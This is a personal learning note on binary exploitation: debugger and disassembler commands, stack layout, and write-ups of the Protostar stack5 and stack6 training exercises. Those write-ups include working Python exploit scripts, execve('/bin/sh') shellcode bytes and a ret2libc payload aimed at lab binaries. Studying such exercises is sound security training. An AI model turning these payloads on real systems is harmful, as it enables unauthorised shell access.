# Security Learning Note

## Binary Exploitation

#### Learning Sources
+ [LiveOverflow Youtube channel](https://www.youtube.com/watch?v=VroEiMOJPm8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=7&t=0s)

#### Before Cracking
+ ```file```: determine file type
+ ```strings```: print the sequences of printable characters in files

#### GDB
+ ```set disassembly-flavor intel```: a more readable style
+ ```disassemble main```: display all assembler instructions of the ```main``` function
+ ```break *address```: for example, ```break *main```
+ ```si```: step one instruction
+ ```info registers```:
    - ```rip / eip```: instruction pointer (program counter)
    - ```rsp / esp```: stack pointer
    - ```eax```: the first 32 bits of the 64-bit ```rax``` register
+ ```set $eax=0```: set the register ```eax``` to 0
+ ```info proc mapping```: report the memory address space ranges accessible in a process.
+ x command: examine the content of a memory address [reference](https://visualgdb.com/gdbreference/commands/x)
    - ```x/4wx $esp```
+ define a "hook", for example, *hook-stop* will execute when the program stop at a breakpoint:
  ```
  (gdb) define hook-stop
  Type commands for definition of "hook-stop".
  End with a line saying just "end".
  >info registers
  >x/32wx $esp+0x1c
  >x/2i $eip
  >end
  ```

### objdump
+ ```objdump -d $FILENAME```: disassembler
+ ```objdump -x $FILENAME```: print header information
+ ```objdump -t $FILENAME```: print the symbol table entries, can be used to find the address of a function

### strace & ltrace
+ ```strace```: trace system calls
+ ```ltrace```: trace library calls

### Other useful tools
+ Radare2, Ghidra, ...

### Parser Differential
+ Use fuzzing technique to make a program failed to be parsed by gdb, radare2, or whatever but able to be executed by ```execve```.

### Stack

+ ebp / rbp: contains the address of the bottom of the stack
+ esp / rsp: contains the address the top of the stack

### Calling Convention:
1. push the paramters to be passed on the stack (in reverse order)
2. ```call``` instruction
    1. push the return address on the stack
    2. set ```eip (rip)``` to the address of the callee 
4. push the value of ```ebp``` on the stack
5. set ```ebp``` to the value of ```esp```
6. align the value of ```esp``` (bitwise and with 0xfffffff0)
7. substract ```esp``` by a certain value to create the stack frame

### End of a Function
1. ```leave``` instruction: ```mov esp, ebp``` then ```pop ebp```
2. ```ret``` instruction (the invert of ```call``` instruction): get and set the next instruction pointer, which is on the top of the stack 

### [Protostar](https://exploit.education/protostar/)

#### [stack5](https://exploit.education/protostar/stack-five/)

1. First analyze the disassembled code:
```
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
```
The goal is to smash the stack frame of ```gets``` and redirect the return address to ```execve("/bin/sh")``` at the return of main function.
2. From the assembly code, we know the buffer starts at ```$esp+0x10```, whose value can be found by GDB.
3. To know the size of padding, we need to know ```$esp``` when ```0x080483da <main+22>:   ret``` is executed. We can find it out by setting a breakpoint at ```ret``` and ```x/wx $esp```. Now we know that the padding should be 76 bytes long. (actually the last 4 bytes is the old ```ebp```, but it does not matter here)
4. determine the value of ```eip```: Where to place our shell code? Here we choose to place it right after the position of ```eip```
5. However, the address space may not be the same every time since the data pushed on the stack can be different (e.g. environment variables). To address this issue, we can find a way to know the exact value by the other code in the binary. However, we can also use NOP(opcode: ```0x90```) slide to make sure that ```eip``` points to the code we control. 
    - make the *eip* point to the middle of the NOP slide
6. add shellcode: copy from [shell-storm](http://shell-storm.org/shellcode/)

!!! info
    use ```int3```(opcode: ```0xCC```) instruction to debug shellcode

!!! warning
    ```python exploit.py | /opt/protostar/bin/stack5``` does not work because stack5's stdin has been redirected to the stdout of exploit.py. When the shell gets executed, it reads nothing but the EOF of the stdout of exploit.py. As a result, the shell does not read any input from our terminal. A possible solution is using ```cat``` to "continue" the pipe and pipe our commands into the stdin of the shell.
    ```bash
    (python exploit.py; cat) | /opt/protostar/bin/stack5
    ```

Python2 Script:
```python
import struct

padding = 'A' * 76
eip = struct.pack('I', 0xbffff6e0+40)
nopslide = '\x90' * 100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding + eip + nopslide + shellcode
```

#### [stack6](https://exploit.education/protostar/stack-six/)

In this task, the return address is restricted so we cannot just set it to an address on the stack. Instead, we take use of the code of ```libc```. The goal is to call ```system()``` with ```/bin/sh``` as the argument. This is a attack method called **ret2libc**.

+ How to call ```system()```
    1. push the argument ("/bin/sh") on the stack
    2. push the return address on the stack
    3. jump to ```system```

+ Thus, when ```ret``` instruction jump to ```system```, the stack should be as follow:
    ```
    -----------------------------
     return address after system  <---- esp
    -----------------------------
         address of "/bin/sh"
    -----------------------------
    ```
+ And our buffer overflow should make the stack be as follow:
    ```
    -----------------------------
             padding
    -----------------------------
         address of system
    -----------------------------
     return address after system 
    -----------------------------
         address of "/bin/sh"
    -----------------------------
    ```
+ script:
    ```python
    import struct

    padding = 'A' * 80
    system = struct.pack('I', 0xb7ecffb0)
    return_after_system = 'AAAA'
    bin_sh = struct.pack('I', 0xb7fb63bf)
    print padding + system + return_after_system + bin_sh
    ```

+ find the address of ```system```: in GDB type ```p system```
+ find the address of "/bin/sh"
    1. use environment variables
    2. find in libc: ```string -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"``` + the start address of libc in the program's memory mapping.